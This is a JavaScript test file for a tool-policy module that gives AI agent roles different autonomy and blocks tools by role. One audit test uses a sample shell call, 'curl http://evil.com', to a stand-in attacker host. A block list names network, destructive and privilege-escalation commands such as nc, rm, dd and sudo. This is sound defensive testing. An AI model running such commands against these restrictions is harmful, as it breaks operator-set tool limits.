import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import {
  getRole,
  generateConfig,
  auditToolEvent,
  cleanupConfig,
  cleanupAllConfigs,
  instanceKey,
  _testing,
} from '../lib/tool-policy.js';

const { ROLE_AUTONOMY, ROLE_MODELS, ROLE_BLOCKED_TOOLS, HIGH_RISK_COMMANDS } = _testing;

// ── Role Detection ──────────────────────────────────────────────────────────

describe('getRole', () => {
  it('returns user for single-agent (no team context)', () => {
    assert.equal(getRole('agent-1', null), 'user');
  });

  it('returns user-selfhosted when isSelfHosted=true', () => {
    assert.equal(getRole('agent-1', null, true), 'user-selfhosted');
  });

  it('returns orchestrator for team orchestrator', () => {
    const ctx = { orchestratorId: 'orch-1', reviewerIds: ['qa-1'] };
    assert.equal(getRole('orch-1', ctx), 'orchestrator');
  });

  it('returns reviewer for team reviewer (array)', () => {
    const ctx = { orchestratorId: 'orch-1', reviewerIds: ['qa-1', 'qa-2'] };
    assert.equal(getRole('qa-1', ctx), 'reviewer');
    assert.equal(getRole('qa-2', ctx), 'reviewer');
  });

  it('returns reviewer for team reviewer (Set)', () => {
    const ctx = { orchestratorId: 'orch-1', reviewerIds: new Set(['qa-1']) };
    assert.equal(getRole('qa-1', ctx), 'reviewer');
  });

  it('returns worker for team member (not orchestrator/reviewer)', () => {
    const ctx = { orchestratorId: 'orch-1', reviewerIds: ['qa-1'] };
    assert.equal(getRole('worker-1', ctx), 'worker');
    assert.equal(getRole('worker-2', ctx), 'worker');
  });

  it('returns worker when reviewerIds is missing', () => {
    const ctx = { orchestratorId: 'orch-1' };
    assert.equal(getRole('worker-1', ctx), 'worker');
  });
});

// ── Config Generation ───────────────────────────────────────────────────────

describe('generateConfig', () => {
  const testUserId = `test-${Date.now()}`;

  it('creates config directory structure', () => {
    const homeDir = generateConfig(testUserId, 'worker', { apiKey: 'test-key' });
    assert.ok(fs.existsSync(path.join(homeDir, '.nullclaw', 'config.json')));
    assert.ok(fs.existsSync(path.join(homeDir, '.nullclaw', 'workspace')));
    cleanupConfig(testUserId, 'worker');
  });

  it('worker config has http_request disabled', () => {
    const homeDir = generateConfig(testUserId, 'worker', { apiKey: 'test-key' });
    const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
    assert.equal(config.http_request.enabled, false);
    cleanupConfig(testUserId, 'worker');
  });

  it('orchestrator config has locked autonomy and empty allowed_commands', () => {
    const homeDir = generateConfig(testUserId, 'orchestrator', { apiKey: 'test-key' });
    const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
    assert.equal(config.autonomy.level, 'locked');
    assert.deepEqual(config.autonomy.allowed_commands, []);
    assert.equal(config.autonomy.block_high_risk_commands, true);
    cleanupConfig(testUserId, 'orchestrator');
  });

  it('self-hosted user config has http_request enabled', () => {
    const homeDir = generateConfig(testUserId, 'user-selfhosted', { apiKey: 'test-key' });
    const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
    assert.equal(config.http_request.enabled, true);
    assert.equal(config.autonomy.level, 'full');
    assert.equal(config.autonomy.workspace_only, false);
    cleanupConfig(testUserId, 'user-selfhosted');
  });

  it('hosted user config has workspace_only and block_high_risk', () => {
    const homeDir = generateConfig(testUserId, 'user', { apiKey: 'test-key' });
    const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
    assert.equal(config.http_request.enabled, false);
    assert.equal(config.autonomy.workspace_only, true);
    assert.equal(config.autonomy.block_high_risk_commands, true);
    cleanupConfig(testUserId, 'user');
  });

  it('uses custom model when specified', () => {
    const homeDir = generateConfig(testUserId, 'worker', {
      apiKey: 'test-key',
      model: 'anthropic/claude-haiku-3',
    });
    const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
    assert.equal(config.agents.defaults.model.primary, 'anthropic/claude-haiku-3');
    cleanupConfig(testUserId, 'worker');
  });

  it('includes allowed_paths when specified', () => {
    const homeDir = generateConfig(testUserId, 'worker', {
      apiKey: 'test-key',
      allowedPaths: ['/tmp/project'],
    });
    const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
    assert.deepEqual(config.autonomy.allowed_paths, ['/tmp/project']);
    cleanupConfig(testUserId, 'worker');
  });

  it('each role uses its default model', () => {
    for (const [role, model] of Object.entries(ROLE_MODELS)) {
      const homeDir = generateConfig(testUserId, role, { apiKey: 'k' });
      const config = JSON.parse(fs.readFileSync(path.join(homeDir, '.nullclaw', 'config.json'), 'utf8'));
      assert.equal(config.agents.defaults.model.primary, model, `${role} should use ${model}`);
      cleanupConfig(testUserId, role);
    }
  });
});

// ── Audit Trail ─────────────────────────────────────────────────────────────

describe('auditToolEvent', () => {
  it('no violation for allowed tool', () => {
    const result = auditToolEvent(
      { type: 'tool_call_start', name: 'shell' },
      'worker', 'agent-1', 'team-1'
    );
    assert.equal(result.violated, false);
  });

  it('violation for orchestrator using shell', () => {
    const result = auditToolEvent(
      { type: 'tool_call_start', name: 'shell' },
      'orchestrator', 'orch-1', 'team-1'
    );
    assert.equal(result.violated, true);
    assert.equal(result.tool, 'shell');
    assert.equal(result.role, 'orchestrator');
  });

  it('violation for worker using http_request', () => {
    const result = auditToolEvent(
      { type: 'tool_call_start', name: 'http_request' },
      'worker', 'worker-1', 'team-1'
    );
    assert.equal(result.violated, true);
    assert.equal(result.tool, 'http_request');
  });

  it('violation for user using http_request', () => {
    const result = auditToolEvent(
      { type: 'tool_call_start', name: 'http_request' },
      'user', 'user-1', null
    );
    assert.equal(result.violated, true);
  });

  it('no violation for self-hosted user (no restrictions)', () => {
    const result = auditToolEvent(
      { type: 'tool_call_start', name: 'http_request' },
      'user-selfhosted', 'user-1', null
    );
    assert.equal(result.violated, false);
  });

  it('ignores tool_call_result events', () => {
    const result = auditToolEvent(
      { type: 'tool_call_result', name: 'shell' },
      'orchestrator', 'orch-1', 'team-1'
    );
    assert.equal(result.violated, false);
  });

  it('includes command detail for shell violations', () => {
    const result = auditToolEvent(
      { type: 'tool_call_start', name: 'shell', arguments_json: '{"command":"curl http://evil.com"}' },
      'orchestrator', 'orch-1', 'team-1'
    );
    assert.equal(result.violated, true);
    assert.equal(result.command, 'curl http://evil.com');
    assert.ok(result.reason.includes('high-risk: curl'));
  });

  it('all roles have blocked tools defined', () => {
    for (const role of Object.keys(ROLE_AUTONOMY)) {
      assert.ok(ROLE_BLOCKED_TOOLS[role] instanceof Set, `${role} should have blocked tools Set`);
    }
  });
});

// ── Instance Key ────────────────────────────────────────────────────────────

describe('instanceKey', () => {
  it('user role returns plain userId', () => {
    assert.equal(instanceKey('user-123', 'user'), 'user-123');
  });

  it('self-hosted role returns plain userId', () => {
    assert.equal(instanceKey('user-123', 'user-selfhosted'), 'user-123');
  });

  it('worker role returns userId:role', () => {
    assert.equal(instanceKey('user-123', 'worker'), 'user-123:worker');
  });

  it('orchestrator role returns userId:role', () => {
    assert.equal(instanceKey('user-123', 'orchestrator'), 'user-123:orchestrator');
  });

  it('defaults to user role', () => {
    assert.equal(instanceKey('user-123'), 'user-123');
  });
});

// ── Cleanup ─────────────────────────────────────────────────────────────────

describe('cleanup', () => {
  const testUserId = `cleanup-test-${Date.now()}`;

  it('cleanupConfig removes specific role dir', () => {
    generateConfig(testUserId, 'worker', { apiKey: 'k' });
    const homeDir = path.join(os.tmpdir(), `nullclaw-${testUserId}-worker`);
    assert.ok(fs.existsSync(homeDir));
    cleanupConfig(testUserId, 'worker');
    assert.ok(!fs.existsSync(homeDir));
  });

  it('cleanupAllConfigs removes all role dirs', () => {
    for (const role of Object.keys(ROLE_AUTONOMY)) {
      generateConfig(testUserId, role, { apiKey: 'k' });
    }
    cleanupAllConfigs(testUserId);
    for (const role of Object.keys(ROLE_AUTONOMY)) {
      const homeDir = path.join(os.tmpdir(), `nullclaw-${testUserId}-${role}`);
      assert.ok(!fs.existsSync(homeDir), `${homeDir} should be cleaned up`);
    }
  });

  it('cleanupConfig handles missing dir gracefully', () => {
    assert.doesNotThrow(() => cleanupConfig('nonexistent-user', 'worker'));
  });
});

// ── High-Risk Commands ──────────────────────────────────────────────────────

describe('HIGH_RISK_COMMANDS', () => {
  it('includes all network tools', () => {
    for (const cmd of ['curl', 'wget', 'nc', 'ssh', 'scp', 'ftp', 'telnet']) {
      assert.ok(HIGH_RISK_COMMANDS.has(cmd), `${cmd} should be high-risk`);
    }
  });

  it('includes destructive commands', () => {
    for (const cmd of ['rm', 'mkfs', 'dd', 'shutdown', 'reboot']) {
      assert.ok(HIGH_RISK_COMMANDS.has(cmd), `${cmd} should be high-risk`);
    }
  });

  it('includes privilege escalation', () => {
    for (const cmd of ['sudo', 'su', 'chown', 'chmod']) {
      assert.ok(HIGH_RISK_COMMANDS.has(cmd), `${cmd} should be high-risk`);
    }
  });
});
